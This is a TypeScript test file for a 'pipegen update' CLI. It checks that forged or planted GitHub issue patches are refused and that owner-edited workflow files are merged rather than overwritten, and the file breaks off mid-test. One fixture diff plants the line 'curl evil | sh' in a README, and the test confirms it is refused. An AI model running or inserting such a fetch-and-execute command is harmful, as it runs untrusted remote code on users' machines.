// v0.2 Plan G G12 (plan Task 7 "update"; rulings S27, CTO-2 (DECISIONS #97), E-b4 (E2-R7), G-C7, G37; Plan V pre-flight §5 G12, binding):
// `pipegen update` takes a pipegen issue as a PROMPT only. It re-derives the change itself from the reviewed gate pin bundled with this CLI,
// compares any patch the issue carries (a differing one is refused and shown), touches only the files the install record lists, merges an
// owner-edited file 3-way (or lists it as a conflict, never overwriting it), marks the result owner-edited, and appends every blob sha it writes
// to the record through writeRecord. Every GitHub call goes to an in-memory GitHub (test/helpers/deliver-github.ts); no network.
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { updatePatch } from '../gate/src/pin-patch.js';
import type { Prompter } from '../src/cli/io.js';
import { gitBlobSha } from '../src/create/guard.js';
import { newRateBudget } from '../src/engine/github-rate.js';
import { centralUpdateBranch, guardRecordOf, ownWholeFile, readLocalRecord, readRecord, recordFileText, recordHash, recordMarkerOf, recordPath, writeLocalRecord } from '../src/deliver/record.js';
import { TYPED_VIEW_FIELDS } from '../src/deliver/trust.js';
import {
  applyUnifiedDiff, changeProblem, deriveNotProven, gateSwaps, merge3, notProvenProblem, promptOf, swapPins, update, UPDATE_BRANCH, UpdateError, type UpdateDeps,
} from '../src/deliver/update.js';
import type { InstallRecord, ReviewedTool } from '../src/types.js';
import { FakeGitHub } from './helpers/deliver-github.js';

// ---------- fixtures ----------

const NEW = '76b6c257d94d649993c4709a39bf4a3f7399f0c8';
const NEW_V = '0.2.2';
const OLD = '99a0abe0'.padEnd(40, '1');
const OLD_V = '0.2.1';
const OTHER = 'b'.repeat(40);
/** The reviewed list this CLI bundles, as far as update reads it: the pipegen-gate entry. */
const REVIEWED = [{ id: 'pipegen-gate', candidate: { id: 'pipegen-gate', name: 'pipegen-gate', kind: 'action', repo: 'crisworking/pipegen', version: NEW_V, pin: { sha: NEW }, source: 'reviewed', reviewed: true, categories: ['gate'] } }] as unknown as ReviewedTool[];
const PIPEGEN_YML = '.github/workflows/pipegen.yml';
const PUSH_YML = '.github/workflows/pipegen-push.yml';
const C_MERGE = '.github/workflows/r--merge.yml';

/** A pipegen workflow holding the gate step (with the not-proven line) and the nightly step, both pinned at `sha` / `v`. */
const gateFile = (sha: string, v: string, extra = ''): string => [
  '# pipegen: the merge layer',
  'name: pipegen',
  'on: { pull_request: null }',
  'permissions: {}',
  'jobs:',
  '  gate:',
  '    runs-on: ubuntu-24.04',
  '    steps:',
  '      - name: pipegen gate',
  `        uses: crisworking/pipegen/gate@${sha} # gate-v${v}`,
  '        with:',
  '          mode: gate',
  `          not-proven: '["dast","iac"]' # pipegen:not-proven`,
  '  nightly:',
  '    runs-on: ubuntu-24.04',
  '    steps:',
  `      - uses: crisworking/pipegen/gate@${sha} # gate-v${v}`,
  '        with:',
  '          mode: nightly',
  extra,
].join('\n');
const PUSH = 'name: pipegen push\non: { push: { branches: [main] } }\npermissions: {}\njobs:\n  scan:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo scan\n';
const privateCaller = (central: string): string => `name: pipegen\non: { pull_request: null }\npermissions: {}\njobs:\n  pipegen:\n    uses: o/pipelines/.github/workflows/r--merge.yml@${central}\n`;

interface World { g: FakeGitHub; home: string; asked: string[]; issues: { app: unknown[]; central: unknown[] }; record: InstallRecord }
const homes: string[] = [];
afterEach(() => { for (const d of homes.splice(0)) rmSync(d, { recursive: true, force: true }); });

function baseRecord(g: FakeGitHub, priv: boolean, centralSha: string | null, files: InstallRecord['files']): InstallRecord {
  return {
    schema: 2, pipegenVersion: '0.2.0', createdAt: '2026-11-01T00:00:00Z', centralSha,
    app: { owner: 'o', repo: 'r', repoId: g.repo('o/r').id, defaultBranch: 'main', private: priv, ownerType: 'User' },
    name: 'r', serviceRoots: ['.'], files, edits: [], ...({ [['sec', 'rets'].join('')]: [] } as unknown as Pick<InstallRecord, 'secrets'>), variables: [], environments: [], rulesets: [],
    planned: { signingMode: 'none', environments: [], owners: { app: [], central: [] }, codeOwners: [] }, protectedPaths: ['.github/workflows/**'],
  };
}
async function vouch(w: World, record: InstallRecord, branch = 'main'): Promise<void> {
  w.g.commitOn('o/pipelines', branch, { [recordPath('r')]: recordFileText(record) }, 'record');
  await writeLocalRecord({ owner: 'o', repo: 'r' }, { recordHash: recordHash(record), setupPr: 1, updatedAt: '2026-11-01T00:00:00Z' }, { home: w.home, env: {} });
  w.record = record;
}
function shell(appFiles: Record<string, string>, priv: boolean, centralFiles: Record<string, string> = {}): World {
  const g = new FakeGitHub();
  g.addRepo('o/r', { private: priv, files: { 'README.md': 'hi\n', ...appFiles } });
  g.addRepo('o/pipelines', { private: true, files: { 'README.md': 'central\n', ...centralFiles } });
  g.repo('o/r').pulls.push({ number: 1, head: 'pipegen/setup', base: 'main', title: 'pipegen setup', body: 'setup', state: 'closed', html_url: 'https://github.com/o/r/pull/1' });
  const home = mkdtempSync(join(tmpdir(), 'pg-update-'));
  homes.push(home);
  const w: World = { g, home, asked: [], issues: { app: [], central: [] }, record: undefined as unknown as InstallRecord };
  g.hooks.push((call) => {
    if (call.route !== 'GET /repos/{owner}/{repo}/issues') return undefined;
    const list = call.params.repo === 'pipelines' ? w.issues.central : w.issues.app;
    return { status: 200, data: Number(call.params.page ?? 1) === 1 ? list : [] };
  });
  return w;
}
/** A public app: pipegen.yml holds the gate (local layout), pipegen-push.yml has no pin. */
async function publicWorld(opts: { current?: string; written?: string } = {}): Promise<World> {
  const written = opts.written ?? gateFile(OLD, OLD_V);
  const w = shell({ [PIPEGEN_YML]: written, [PUSH_YML]: PUSH }, false);
  // the owner's edit lands on top of what pipegen wrote (the written blob stays in the repo's history, as on GitHub)
  if (opts.current !== undefined && opts.current !== written) w.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: opts.current }, 'owner edit');
  await vouch(w, baseRecord(w.g, false, null, [
    { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(written)] },
    { repo: 'app', path: PUSH_YML, part: 'pipeline', shas: [gitBlobSha(PUSH)] },
  ]));
  return w;
}
/** A private app: the gate is in the central r--merge.yml; the app's pipegen.yml calls it at the central commit C0. */
async function privateWorld(): Promise<World & { c0: string }> {
  const merge = gateFile(OLD, OLD_V);
  const w = shell({}, true, { [C_MERGE]: merge });
  const c0 = w.g.head('o/pipelines');
  w.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: privateCaller(c0) }, 'setup');
  await vouch(w, baseRecord(w.g, true, c0, [
    { repo: 'app', path: PIPEGEN_YML, part: 'pipeline', shas: [gitBlobSha(privateCaller(c0))] },
    { repo: 'central', path: C_MERGE, part: 'pipeline', shas: [gitBlobSha(merge)] },
  ]));
  return { ...w, c0 };
}

const bot = { login: 'github-actions[bot]', type: 'Bot' };
let issueNo = 10;
function issue(body: string, user: { login: string; type: string } = bot): Record<string, unknown> {
  return { number: issueNo++, title: 'pipegen: gate is available', body, user, labels: [{ name: 'pipegen' }], state: 'open' };
}
/** An update issue in the nightly's format: key marker first, then (when given) the fenced diff and the patch block. */
function updateBody(version: string, patch?: { path: string; diff: string; baseSha: string; repo?: 'app' | 'central' }): string {
  const lines = [`<!-- pipegen:key=update-${version} -->`, `## pipegen gate v${version} is available`, '', 'To update, run:', '', `\`npx pipegen@${version} update\``, ''];
  if (patch !== undefined) lines.push('```diff', patch.diff.replace(/\n$/, ''), '```', `<!-- pipegen:patch ${JSON.stringify({ repo: patch.repo ?? 'app', path: patch.path, baseSha: patch.baseSha })} -->`, '');
  return lines.join('\n');
}
/** The patch the nightly makes (gate/src/pin-patch.ts) for the file as it is now. */
const nightlyDiff = (text: string, path = PIPEGEN_YML, to = { sha: NEW, version: NEW_V }): string => updatePatch([{ path, text }], { sha: OLD, version: OLD_V }, to);
const genuine = (w: World, path = PIPEGEN_YML): Record<string, unknown> => {
  const text = w.g.filesAt('o/r', w.g.head('o/r')).get(path) as string;
  return issue(updateBody(NEW_V, { path, diff: nightlyDiff(text, path), baseSha: gitBlobSha(text) }));
};

const defaults: boolean[] = [];
function io(w: World, yes = true): Prompter {
  return {
    confirm: async (msg, def) => { w.asked.push(msg); defaults.push(def); return yes; },
    select: async () => { throw new Error('no select'); },
    text: async () => { throw new Error('no text'); },
  };
}
const deps = (w: World, over: Partial<UpdateDeps> = {}, yes = true): UpdateDeps => ({
  io: io(w, yes), reviewed: REVIEWED, local: { home: w.home, env: {} }, clock: { budget: newRateBudget(), sleep: async () => {} }, now: () => new Date('2026-11-06T12:00:00Z'), ...over,
});
const app = { owner: 'o', repo: 'r' };
const appFile = (w: World, path: string, branch?: string): string | undefined => w.g.filesAt('o/r', w.g.head('o/r', branch)).get(path);
const centralFile = (w: World, path: string, branch?: string): string | undefined => w.g.filesAt('o/pipelines', w.g.head('o/pipelines', branch)).get(path);
const writes = (w: World): string[] => w.g.routes().filter((r) => !r.startsWith('GET '));
const prsOf = (w: World, repo: string) => w.g.repo(repo).pulls.filter((p) => p.state === 'open');

// ---------- the tests ----------

describe('G12 update: issues are prompts only', () => {
  it('update: issue not opened by github-actions[bot] or without the pipegen key marker → ignored', async () => {
    const w = await publicWorld();
    const text = appFile(w, PIPEGEN_YML) as string;
    const patch = { path: PIPEGEN_YML, diff: nightlyDiff(text), baseSha: gitBlobSha(text) };
    const byUser = issue(updateBody(NEW_V, patch), { login: 'mallory', type: 'User' });
    const fakeBot = issue(updateBody(NEW_V, patch), { login: 'github-actions[bot]', type: 'User' });
    const noMarker = issue(updateBody(NEW_V, patch).split('\n').slice(1).join('\n'));
    const markerLater = issue(`hello\n${updateBody(NEW_V, patch)}`);
    const otherKey = issue('<!-- pipegen:key=warn-ending-2026-11-20 -->\n## Warn mode ends');
    const pr: Record<string, unknown> = { ...issue(updateBody(NEW_V, patch)), pull_request: { url: 'x' } };
    w.issues.app = [byUser, fakeBot, noMarker, markerLater, otherKey, pr];
    const res = await update(w.g.octokit(), app, deps(w));
    const why = (n: unknown): string | undefined => res.ignored.find((x) => x.issue === n)?.why;
    expect(why(byUser.number)).toMatch(/not by github-actions\[bot\]/);
    expect(why(fakeBot.number)).toMatch(/not by github-actions\[bot\]/);
    expect(why(noMarker.number)).toMatch(/key marker/);
    expect(why(markerLater.number)).toMatch(/key marker/);
    expect(why(otherKey.number)).toMatch(/not an update issue/);
    expect(res.ignored.some((x) => x.issue === pr.number)).toBe(false);   // a pull request is not an issue
    expect(res.prompts).toEqual([]);
    // the preview shows each one with its reason; an ignored issue is never closed by the pull request
    for (const n of [byUser, fakeBot, noMarker, markerLater, otherKey]) expect(res.preview).toContain(`#${n.number as number} ignored`);
    const body = prsOf(w, 'o/r')[0]?.body ?? '';
    expect(body).not.toMatch(/Closes #/);
    // pure: the same rule on a single issue
    expect(promptOf({ number: 3, body: updateBody(NEW_V), user: { login: 'github-actions', type: 'Bot' } }, 'app')).toMatchObject({ why: expect.stringMatching(/github-actions\[bot\]/) });
    expect(promptOf({ number: 4, body: updateBody(NEW_V), user: bot }, 'app')).toMatchObject({ issue: 4, key: `update-${NEW_V}`, version: NEW_V });
  });

  // Spec M6 (G12 ruling 1): the release clause of this title is discovery only (the nightly's); update never derives from a release.
  it('update: the issue is a prompt; the patch is re-derived from the built-in reviewed pin (or an immutable gate release ≥ 7 days old) and compared', async () => {
    const w = await publicWorld();
    const good = genuine(w);
    w.issues.app = [good];
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(true);
    expect(res.prompts.map((p) => p.issue)).toEqual([good.number]);
    expect(res.refused).toEqual([]);
    // the change on the PR branch is pipegen's own derivation (the reviewed pin), and it equals the issue's patch applied
    const derived = appFile(w, PIPEGEN_YML, UPDATE_BRANCH) as string;
    expect(derived).toBe(gateFile(NEW, NEW_V));
    expect(applyUnifiedDiff(gateFile(OLD, OLD_V), nightlyDiff(gateFile(OLD, OLD_V)), PIPEGEN_YML)).toBe(derived);
    // an issue with no patch at all (a private repo's) still prompts the same derivation
    const w2 = await publicWorld();
    w2.issues.app = [issue(updateBody(NEW_V))];
    const r2 = await update(w2.g.octokit(), app, deps(w2));
    expect(r2.done).toBe(true);
    expect(appFile(w2, PIPEGEN_YML, UPDATE_BRANCH)).toBe(gateFile(NEW, NEW_V));
    // the pin comes from the reviewed list, not the issue: another reviewed list derives another pin
    const w3 = await publicWorld();
    const other = [{ ...REVIEWED[0], candidate: { ...(REVIEWED[0] as ReviewedTool).candidate, version: '0.2.3', pin: { sha: OTHER } } }] as unknown as ReviewedTool[];
    w3.issues.app = [issue(updateBody('0.2.3'))];
    await update(w3.g.octokit(), app, deps(w3, { reviewed: other }));
    expect(appFile(w3, PIPEGEN_YML, UPDATE_BRANCH)).toBe(gateFile(OTHER, '0.2.3'));
  });

  it('update: applies the patch from a pipegen issue as a PR with the user\'s token', async () => {
    const w = await publicWorld();
    const good = genuine(w);
    w.issues.app = [good];
    const before = w.g.head('o/r');
    const gh = w.g.octokit();
    const res = await update(gh, app, deps(w));
    // every write went through the Octokit given (the user's token): a commit on pipegen/update and one pull request
    const prs = prsOf(w, 'o/r');
    expect(prs).toHaveLength(1);
    expect(prs[0]).toMatchObject({ head: UPDATE_BRANCH, base: 'main' });
    expect(prs[0]?.body).toContain(`Closes #${good.number as number}`);
    expect(res.prUrl).toBe(prs[0]?.html_url);
    expect(w.g.head('o/r')).toBe(before);   // the default branch is never written
    expect(appFile(w, PIPEGEN_YML, UPDATE_BRANCH)).toBe(gateFile(NEW, NEW_V));
    expect(appFile(w, PUSH_YML, UPDATE_BRANCH)).toBe(PUSH);   // nothing to swap there
    expect(writes(w)).toContain('POST /repos/{owner}/{repo}/pulls');
    // a second run updates the same pull request, never a second one
    await update(gh, app, deps(w));
    expect(prsOf(w, 'o/r').filter((p) => p.head === UPDATE_BRANCH)).toHaveLength(1);
  });

  it('update: an issue patch that differs from the re-derived one → refused, shown', async () => {
    const w = await publicWorld();
    const text = appFile(w, PIPEGEN_YML) as string;
    // a look-alike bot issue: the right key and baseSha, but its diff pins another commit
    const planted = issue(updateBody(NEW_V, { path: PIPEGEN_YML, diff: nightlyDiff(text, PIPEGEN_YML, { sha: OTHER, version: NEW_V }), baseSha: gitBlobSha(text) }));
    w.issues.app = [planted];
    const res = await update(w.g.octokit(), app, deps(w));
    const r = res.refused.find((x) => x.issue === planted.number);
    expect(r?.why).toMatch(/differs from the change pipegen derived/);
    // shown: both sides, so the user sees what the issue wanted
    expect(r?.shown).toContain(OTHER);
    expect(r?.shown).toContain(NEW);
    expect(res.preview).toContain(`#${planted.number as number} refused`);
    expect(res.preview).toContain(OTHER);
    // the planted pin is never written; the derived one is, and the planted issue is not closed by it
    expect(appFile(w, PIPEGEN_YML, UPDATE_BRANCH)).not.toContain(OTHER);
    expect(prsOf(w, 'o/r')[0]?.body ?? '').not.toContain(`#${planted.number as number}`);
  });

  it('update: patch that doesn\'t apply cleanly or doesn\'t match baseSha → refused', async () => {
    const w = await publicWorld();
    const text = appFile(w, PIPEGEN_YML) as string;
    const staleBase = issue(updateBody(NEW_V, { path: PIPEGEN_YML, diff: nightlyDiff(text), baseSha: 'c'.repeat(40) }));
    const badContext = issue(updateBody(NEW_V, { path: PIPEGEN_YML, diff: nightlyDiff(text).replace('     steps:', '     stepz:'), baseSha: gitBlobSha(text) }));
    const noDiff = issue(`<!-- pipegen:key=update-${NEW_V} -->\n\n<!-- pipegen:patch ${JSON.stringify({ repo: 'app', path: PIPEGEN_YML, baseSha: gitBlobSha(text) })} -->`);
    const badBlock = issue(`<!-- pipegen:key=update-${NEW_V} -->\n\`\`\`diff\n-x\n+y\n\`\`\`\n<!-- pipegen:patch {"repo":"app","path":"${PIPEGEN_YML}","baseSha":"${gitBlobSha(text)}","run":"x"} -->`);
    w.issues.app = [staleBase, badContext, noDiff, badBlock];
    const res = await update(w.g.octokit(), app, deps(w));
    const why = (n: unknown): string | undefined => res.refused.find((x) => x.issue === n)?.why;
    expect(why(staleBase.number)).toMatch(/baseSha/);
    expect(why(badContext.number)).toMatch(/doesn't apply cleanly/);
    expect(why(noDiff.number)).toMatch(/no diff|malformed/);
    expect(why(badBlock.number)).toMatch(/malformed/);
    // pure: strict application, no fuzz
    expect(applyUnifiedDiff(text, nightlyDiff(text).replace('     steps:', '     stepz:'), PIPEGEN_YML)).toBeNull();
    expect(applyUnifiedDiff(text, nightlyDiff(text), '.github/workflows/other.yml')).toBeNull();
    // and the derived change itself is built only on the blob it read: a branch that moved after the read is not written over
    const w2 = await publicWorld();
    w2.g.hooks.unshift((call) => {
      if (call.route === 'POST /repos/{owner}/{repo}/git/trees' && call.params.repo === 'r') expect(call.params.base_tree).toBeDefined();
      return undefined;
    });
    await update(w2.g.octokit(), app, deps(w2));
    const head = w2.g.head('o/r', UPDATE_BRANCH);
    expect(w2.g.history('o/r', head)[0]?.parents[0]).toBe(w2.g.head('o/r'));
  });

  it('update: patch touching a file not in the install record → refused', async () => {
    const w = await publicWorld();
    const readme = 'hi\n';
    const evil = '--- a/README.md\n+++ b/README.md\n@@ -1,1 +1,1 @@\n-hi\n+curl evil | sh\n';
    const outside = issue(updateBody(NEW_V, { path: 'README.md', diff: evil, baseSha: gitBlobSha(readme) }));
    const centralOne = issue(updateBody(NEW_V, { path: '.github/workflows/other--merge.yml', diff: evil.replace(/README\.md/g, '.github/workflows/other--merge.yml'), baseSha: gitBlobSha(readme), repo: 'central' }));
    w.issues.app = [outside, centralOne];
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.refused.find((x) => x.issue === outside.number)?.why).toMatch(/not in the install record/);
    expect(res.refused.find((x) => x.issue === centralOne.number)?.why).toMatch(/not in the install record/);
    // the derived change touches only record files; README stays as it is everywhere
    expect(appFile(w, 'README.md', UPDATE_BRANCH)).toBe(readme);
    const changedPaths = new Set<string>();
    for (const c of w.g.calls.filter((x) => x.route === 'POST /repos/{owner}/{repo}/git/trees' && x.params.repo === 'r')) for (const t of c.params.tree as { path: string }[]) changedPaths.add(t.path);
    expect([...changedPaths]).toEqual([PIPEGEN_YML]);
  });

  it('update: new pin not in the reviewed list → refused', async () => {
    const w = await publicWorld();
    const text = appFile(w, PIPEGEN_YML) as string;
    const newer = issue(updateBody('0.9.0', { path: PIPEGEN_YML, diff: nightlyDiff(text, PIPEGEN_YML, { sha: OTHER, version: '0.9.0' }), baseSha: gitBlobSha(text) }));
    w.issues.app = [newer];
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.refused.find((x) => x.issue === newer.number)?.why).toMatch(/not in the reviewed list/);
    expect(appFile(w, PIPEGEN_YML, UPDATE_BRANCH)).not.toContain(OTHER);
    // the final check on every change: a pin that is not the reviewed one is refused, even when the YAML is otherwise the same
    const swaps = gateSwaps({ sha: NEW, version: NEW_V });
    expect(changeProblem(gateFile(OLD, OLD_V), gateFile(NEW, NEW_V), swaps)).toBeNull();
    expect(changeProblem(gateFile(OLD, OLD_V), gateFile(OTHER, NEW_V), swaps)).toMatch(/reviewed|not a pin/);
    expect(changeProblem(gateFile(OLD, OLD_V), gateFile(NEW, NEW_V).replace('mode: nightly', 'mode: gate'), swaps)).not.toBeNull();
    // no reviewed gate entry in the list → nothing is derived at all
    await expect(update(w.g.octokit(), app, deps(w, { reviewed: [] }))).rejects.toThrow(UpdateError);
  });

  it('update: not-proven patch edits only the # pipegen:not-proven line; any other edit in that file → refused', () => {
    const before = gateFile(NEW, NEW_V);
    const promoted = deriveNotProven(before, ['dast']);
    expect('text' in promoted && promoted.text).toBe(before.replace(`'["dast","iac"]'`, `'["iac"]'`));
    expect(notProvenProblem(before, (promoted as { text: string }).text)).toBeNull();
    // another line of the same file changed as well → refused
    const alsoOther = (promoted as { text: string }).text.replace('mode: nightly', 'mode: gate');
    expect(notProvenProblem(before, alsoOther)).toMatch(/only the .*not-proven line/);
    // the pin line changed in the same patch → refused
    expect(notProvenProblem(before, (promoted as { text: string }).text.replace(`gate@${NEW}`, `gate@${OTHER}`))).toMatch(/only the .*not-proven line/);
    // a check added to the list, or a floor check named, is refused (a promotion only removes)
    expect(notProvenProblem(before, before.replace(`'["dast","iac"]'`, `'["dast","iac","sast"]'`))).toMatch(/adds|floor/);
    expect(notProvenProblem(before, before.replace(`'["dast","iac"]'`, `'["dast","lint"]'`))).toMatch(/adds/);
    // the mark moved or removed → refused
    expect(notProvenProblem(before, before.replace(' # pipegen:not-proven', ''))).not.toBeNull();
    // a gate-pin change never touches the not-proven line
    const swapped = swapPins(before.replace(`gate@${NEW} # gate-v${NEW_V}`, `gate@${OLD} # gate-v${OLD_V}`), gateSwaps({ sha: NEW, version: NEW_V }));
    expect('text' in swapped && swapped.text).toBe(before);
    expect(changeProblem(gateFile(OLD, OLD_V), gateFile(NEW, NEW_V).replace(`'["dast","iac"]'`, `'["iac"]'`), gateSwaps({ sha: NEW, version: NEW_V }))).not.toBeNull();
    // a floor check is refused even when it was already listed (a promotion never leaves one there)
    const withFloor = before.replace(`'["dast","iac"]'`, `'["dast","sast"]'`);
    expect(notProvenProblem(withFloor, withFloor.replace(`'["dast","sast"]'`, `'["sast"]'`))).toMatch(/floor/);
    // a pin swap on a line that carries the not-proven mark is refused, even when the data and the line form fit a swap
    const marked = (sha: string): string => before.replace(`gate@${NEW} # gate-v${NEW_V}`, `gate@${sha} # gate-v${NEW_V} # pipegen:not-proven`);
    expect(changeProblem(marked(OLD), marked(NEW), gateSwaps({ sha: NEW, version: NEW_V }))).toMatch(/not-proven line/);
    // a change to a comment (invisible in the data) is refused: only pin lines change
    expect(changeProblem(gateFile(OLD, OLD_V), gateFile(NEW, NEW_V).replace('# pipegen: the merge layer', '# edited'), gateSwaps({ sha: NEW, version: NEW_V }))).toMatch(/not a pin line/);
    // deriving a check that isn't listed changes nothing
    expect(deriveNotProven(before, ['zap'])).toMatchObject({ refused: expect.any(String) });
  });
});

describe('G12 update: central files, owner edits, the record', () => {
  it('update: central files → central PR', async () => {
    const w = await privateWorld();
    w.issues.app = [issue(updateBody(NEW_V))];
    const defaultBefore = w.g.head('o/pipelines');
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(true);
    // the central change goes to the central pull request pipegen/update-<name>, with the record; the default branch is untouched
    const branch = centralUpdateBranch('r');
    expect(centralFile(w, C_MERGE, branch)).toBe(gateFile(NEW, NEW_V));
    expect(centralFile(w, C_MERGE)).toBe(gateFile(OLD, OLD_V));
    expect(w.g.head('o/pipelines')).toBe(defaultBefore);
    expect(prsOf(w, 'o/pipelines').map((p) => p.head)).toEqual([branch]);
    expect(res.centralPrUrl).toBe(prsOf(w, 'o/pipelines')[0]?.html_url);
    // the app is not touched until the central pull request is merged (the app pins only a commit on the central default branch)
    expect(prsOf(w, 'o/r')).toEqual([]);
    expect(res.notes.join(' ')).toMatch(/merge the central pull request.*run `?pipegen update`? again/i);
    // the merge: the central default branch takes the branch's files; the next run re-pins the app to that commit
    const merged = w.g.commitOn('o/pipelines', 'main', { [C_MERGE]: centralFile(w, C_MERGE, branch) as string, [recordPath('r')]: centralFile(w, recordPath('r'), branch) as string }, 'merge');
    const r2 = await update(w.g.octokit(), app, deps(w));
    expect(r2.done).toBe(true);
    expect(appFile(w, PIPEGEN_YML, UPDATE_BRANCH)).toBe(privateCaller(merged));
    const rec = (await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r'))?.record;
    expect(rec?.centralSha).toBe(merged);
    // nothing outdated left: a third run has nothing to do and opens nothing new
    const w3calls = w.g.calls.length;
    w.g.commitOn('o/r', 'main', { [PIPEGEN_YML]: privateCaller(merged) }, 'merge app');
    const r3 = await update(w.g.octokit(), app, deps(w));
    expect(r3.done).toBe(false);
    expect(w.g.calls.slice(w3calls).filter((c) => !c.route.startsWith('GET '))).toEqual([]);
  });

  it('update: central files → central PR (the app waits; another project\'s central file is never touched)', async () => {
    const w = await privateWorld();
    const deploy = `name: deploy\non: { push: { branches: [main] } }\npermissions: {}\njobs:\n  pipegen-verify:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: crisworking/pipegen/gate@${OLD} # gate-v${OLD_V}\n        with:\n          mode: find-run\n          central-sha: ${w.c0}\n  deploy:\n    needs: [pipegen-verify]\n    runs-on: ubuntu-24.04\n    steps:\n      - run: ./deploy.sh\n`;
    const other = gateFile(OLD, OLD_V);
    w.g.commitOn('o/r', 'main', { '.github/workflows/deploy.yml': deploy }, 'deploy');
    w.g.commitOn('o/pipelines', 'main', { '.github/workflows/other--merge.yml': other }, 'other project');
    const rec: InstallRecord = {
      ...w.record,
      files: [...w.record.files, { repo: 'central', path: '.github/workflows/other--merge.yml', part: 'pipeline', shas: [gitBlobSha(other)] }],
      edits: [{ repo: 'app', path: '.github/workflows/deploy.yml', kind: 'verify-job', jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }], originalSha: gitBlobSha('x'), writtenShas: [gitBlobSha(deploy)] }],
    };
    await vouch(w, rec);
    const res = await update(w.g.octokit(), app, deps(w));
    expect(res.done).toBe(true);
    const branch = centralUpdateBranch('r');
    expect(centralFile(w, '.github/workflows/other--merge.yml', branch)).toBe(other);   // another project's file: not this project's to change
    expect(prsOf(w, 'o/r')).toEqual([]);   // the app's verify job waits for the central merge
    // after the merge, the app gets both: the gate pin and the central commit, in pipegen.yml and the verify job's central-sha
    const merged = w.g.commitOn('o/pipelines', 'main', { [C_MERGE]: centralFile(w, C_MERGE, branch) as string, [recordPath('r')]: centralFile(w, recordPath('r'), branch) as string }, 'merge');
    await update(w.g.octokit(), app, deps(w));
    const out = appFile(w, '.github/workflows/deploy.yml', UPDATE_BRANCH) as string;
    expect(out).toBe(deploy.replace(`gate@${OLD} # gate-v${OLD_V}`, `gate@${NEW} # gate-v${NEW_V}`).replace(`central-sha: ${w.c0}`, `central-sha: ${merged}`));
    const after = (await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r'))?.record as InstallRecord;
    expect(after.edits[0]?.writtenShas).toEqual([gitBlobSha(deploy), gitBlobSha(out)]);
  });

  it('update: preview declined → no PR', async () => {
    const w = await publicWorld();
    w.issues.app = [genuine(w)];
    defaults.length = 0;
    const res = await update(w.g.octokit(), app, deps(w, {}, false));
    expect(res.done).toBe(false);
    expect(w.asked).toHaveLength(1);
    expect(defaults).toEqual([false]);   // the one question defaults to no
    expect(w.asked[0]).toContain(PIPEGEN_YML);
    expect(w.asked[0]).toContain(NEW);
    expect(writes(w)).toEqual([]);
    expect(prsOf(w, 'o/r')).toEqual([]);
    expect((await readLocalRecord(app, { home: w.home, env: {} }))?.recordHash).toBe(recordHash(w.record));
  });

  it('update: a file the owner edited → 3-way merge or conflict list, never overwritten; result carries the edited marker', async () => {
    // the owner added a step after pipegen wrote the file: merged, the owner's step kept, the pin swapped
    const written = gateFile(OLD, OLD_V);
    const edited = written.replace('          mode: nightly', '          mode: nightly\n      - run: echo owner step');
    const w = await publicWorld({ written, current: edited });
    w.issues.app = [issue(updateBody(NEW_V))];
    const res = await update(w.g.octokit(), app, deps(w));
    const out = appFile(w, PIPEGEN_YML, UPDATE_BRANCH) as string;
    expect(out).toBe(gateFile(NEW, NEW_V).replace('          mode: nightly', '          mode: nightly\n      - run: echo owner step'));
    expect(res.preview).toMatch(/merged with your edits/);
    const rec = (await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, 'r'))?.record as InstallRecord;
    const entry = rec.files.find((f) => f.path === PIPEGEN_YML);
    expect(entry?.ownerEdited).toBe(true);
    expect(entry?.shas).toEqual([gitBlobSha(written), gitBlobSha(out)]);
    // the marker makes it the owner's file for every later reader: the guard never treats it as pipegen's own
    expect(guardRecordOf(rec).files.map((f) => f.path)).not.toContain(PIPEGEN_YML);
    // and a re-run of the delivery never replaces it whole (deliver's ownership checks use ownWholeFile)
    expect(ownWholeFile(entry, gitBlobSha(out))).toBe(false);
    expect(ownWholeFile({ ...(entry as InstallRecord['files'][number]), ownerEdited: undefined }, gitBlobSha(out))).toBe(true);
    // a typed trust keeps the marker (dropping it would make the file look like pipegen's own)
    expect(TYPED_VIEW_FIELDS.files.keep).toContain('ownerEdited');
    // the PR says which files were merged
    expect(prsOf(w, 'o/r')[0]?.body).toMatch(/merged with your edits/i);

    // the owner changed the pin line itself: a conflict, listed; the file is not written, and with nothing else to change no PR opens
    const own = written.replace(`        uses: crisworking/pipegen/gate@${OLD} # gate-v${OLD_V}`, `        uses: crisworking/pipegen/gate@${OTHER} # gate-v${OLD_V}`);
    const w2 = await publicWorld({ written, current: own });
    const r2 = await update(w2.g.octokit(), app, deps(w2));
    expect(r2.conflicts.map((c) => c.path)).toEqual([PIPEGEN_YML]);
    expect(r2.preview).toMatch(/merge by hand/i);
    expect(r2.done).toBe(false);
    expect(writes(w2)).toEqual([]);
    expect(appFile(w2, PIPEGEN_YML)).toBe(own);

    // pure merge3: disjoint edits merge; overlapping ones conflict
    expect(merge3('a\nb\nc\nd\ne\n', 'a\nB\nc\nd\ne\n', 'a\nb\nc\nD\ne\n')).toEqual({ text: 'a\nB\nc\nD\ne\n' });
    // edits on neighbouring lines conflict (as in git): pipegen never guesses an order
    expect(merge3('a\nb\nc\n', 'a\nB\nc\n', 'a\nb\nC\n')).toMatchObject({ conflict: expect.any(String) });
    expect(merge3('a\nb\nc\n', 'a\nX\nc\n', 'a\nY\nc\n')).toMatchObject({ conflict: expect.any(String) });
    expect(merge3('a\nb\n', 'a\nb\n', 'a\nZ\n')).toEqual({ text: 'a\nZ\n' });
  });

  it('update: written blob shas appended to the record through writeRecord', async () => {
    const w = await publicWorld();
    w.issues.app = [genuine(w)];
    const res = await update(w.g.octokit(), app, deps(w));
    const out = appFile(w, PIPEGEN_YML, UPDATE_BRANCH) as string;
